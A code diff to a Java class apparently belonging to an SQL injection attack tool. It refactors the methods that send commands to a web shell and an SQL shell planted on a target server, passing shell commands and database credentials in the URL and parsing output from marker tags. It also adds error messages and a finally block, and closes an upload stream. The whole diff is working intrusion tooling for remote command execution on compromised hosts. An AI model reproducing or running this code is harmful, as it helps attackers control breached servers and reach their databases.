@@ -22,8 +22,6 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
-import java.nio.charset.Charset;
-import java.nio.charset.CharsetEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.UUID;
@@ -283,6 +281,8 @@ public class RessourceAccessObject {
                     }
                 } while (len > 0);
 
+                imgIs.close();
+                
                 if(result.indexOf("SQLiy") > -1)
                     model.sendMessage("Upload successful.");
                 else
@@ -449,6 +449,7 @@ public class RessourceAccessObject {
      */
     public void executeShell(String cmd, UUID terminalID, String wbhPath) {
         URLConnection con;
+        String result = "";
         try {
             con = new URL(wbhPath+WEBSHELL_FILENAME+"?c="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")).openConnection();
             con.setReadTimeout(60000);
@@ -462,14 +463,19 @@ public class RessourceAccessObject {
             Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
             regexSearch.find();
 
-            Request request = new Request();
-            request.setMessage("GetShellResult");
-            request.setParameters(terminalID, regexSearch.group(1), cmd);
-            model.interact(request);
+            result = regexSearch.group(1);
         } catch (MalformedURLException e) {
             this.model.sendDebugMessage(e);
+            this.model.sendMessage("WebShell error: problem with shell URL");
         } catch (IOException e) {
             this.model.sendDebugMessage(e);
+            this.model.sendMessage("WebShell error: connection problem");
+        }finally{
+        	// Unfroze interface
+        	Request request = new Request();
+        	request.setMessage("GetShellResult");
+        	request.setParameters(terminalID, result, cmd);
+        	model.interact(request);
         }
     }
 
@@ -521,6 +527,7 @@ public class RessourceAccessObject {
 
     public void executeSQLShell(String cmd, UUID terminalID, String wbhPath, String user, String pass) {
         URLConnection con;
+        String result = "";
         try {
             con = new URL(wbhPath+SQLSHELL_FILENAME+"?q="+URLEncoder.encode(cmd.trim(), "ISO-8859-1")+
                     "&u="+user+"&p="+pass).openConnection();
@@ -534,15 +541,20 @@ public class RessourceAccessObject {
 
             Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
             regexSearch.find();
-
-            Request request = new Request();
-            request.setMessage("GetSQLShellResult");
-            request.setParameters(terminalID, regexSearch.group(1), cmd);
-            model.interact(request);
+            
+            result = regexSearch.group(1);
         } catch (MalformedURLException e) {
             this.model.sendDebugMessage(e);
+            this.model.sendMessage("SQLShell error: problem with shell URL");
         } catch (IOException e) {
             this.model.sendDebugMessage(e);
+            this.model.sendMessage("SQLShell error: connection problem");
+        }finally{
+        	// Unfroze interface
+        	Request request = new Request();
+        	request.setMessage("GetSQLShellResult");
+        	request.setParameters(terminalID, result, cmd);
+        	model.interact(request);
         }
     }
 }
